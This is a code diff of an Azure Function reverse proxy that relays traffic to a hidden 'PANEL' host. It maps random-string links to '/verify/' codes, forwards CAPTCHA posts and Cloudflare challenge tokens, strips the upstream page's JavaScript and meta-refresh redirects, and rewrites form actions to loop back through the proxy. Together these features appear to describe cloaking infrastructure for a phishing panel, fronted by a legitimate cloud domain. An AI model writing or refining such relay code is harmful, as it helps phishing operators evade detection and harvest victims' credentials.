@@ -6,14 +6,13 @@ module.exports = async function (context, req) {
     let path = req.headers['x-ms-original-url'] || req.url || '/';
     try { if (path.startsWith('http')) { const u = new URL(path); path = u.pathname + u.search; } } catch(e){}
     
-    // Remove the proxy prefix if it exists
+    // Remove the proxy prefix if it exists (e.g. /api/proxy)
     path = path.replace(/^\/api\/proxy/, '');
 
     const parts = path.split('/').filter(Boolean);
     let originalRandomString = '';
 
     // 🚨 SMART ROUTING 🚨
-    // If the path is /RANDOM/CODE or /verify/CODE or /l/CODE
     if (parts.length === 2 && parts[0] !== 'api' && parts[1].length > 4) {
         originalRandomString = parts[0];
         path = `/verify/${parts[1]}`;
@@ -23,7 +22,6 @@ module.exports = async function (context, req) {
 
     if (!path.startsWith('/')) path = '/' + path;
 
-    // Pass along query strings (like ?__cf_chl_tk=...)
     if (req.query && Object.keys(req.query).length > 0) {
         const qs = new URLSearchParams(req.query).toString();
         if (!path.includes('?')) path += '?' + qs;
@@ -41,7 +39,6 @@ module.exports = async function (context, req) {
     if (req.headers['content-type']) forwardHeaders['Content-Type'] = req.headers['content-type'];
 
     let body;
-    // Handle POST requests (when the CAPTCHA button is clicked)
     if (!['GET','HEAD'].includes(req.method) && req.body) {
         body = typeof req.body === 'string' ? req.body : JSON.stringify(req.body);
         if (!forwardHeaders['Content-Type']) forwardHeaders['Content-Type'] = 'application/json';
@@ -51,7 +48,6 @@ module.exports = async function (context, req) {
         let currentUrl = `https://${PANEL}${path}`;
         let r;
 
-        // Server-side redirect following
         for (let hop = 0; hop < 5; hop++) {
             r = await fetch(currentUrl, {
                 method: req.method,
@@ -75,7 +71,7 @@ module.exports = async function (context, req) {
         const contentType  = r.headers.get('content-type') || 'text/html';
 
         if (contentType.includes('text/html')) {
-            // Destroy client-side JavaScript redirects
+            // Strip JS redirects
             responseBody = responseBody.replace(/<script\b[^>]*>([\s\S]*?)<\/script>/gi, function(match, scriptContent) {
                 if (scriptContent.includes('window.location') || scriptContent.includes('location.href')) {
                     return ''; 
@@ -84,7 +80,10 @@ module.exports = async function (context, req) {
             });
             responseBody = responseBody.replace(/window\.location(\.[a-zA-Z]+)?\s*=\s*['"][^'"]+['"];?/gi, '');
             responseBody = responseBody.replace(/window\.location\.(replace|assign)\(['"][^'"]+['"]\);?/gi, '');
-            responseBody = responseBody.replace(/<meta[^>]*http-equiv=["']?refresh["']?[^>]*>/gi, '');
+
+            // 🚨 FIX THE FORM ACTION FOR THE BROWSER 🚨
+            // If the panel returns a form with action="/api/proxy/...", ensure the browser submits to it properly
+            responseBody = responseBody.replace(/action="\/verify\/([^"]+)"/gi, `action="/api/proxy/${originalRandomString}/$1"`);
         }
 
         const respHeaders = {
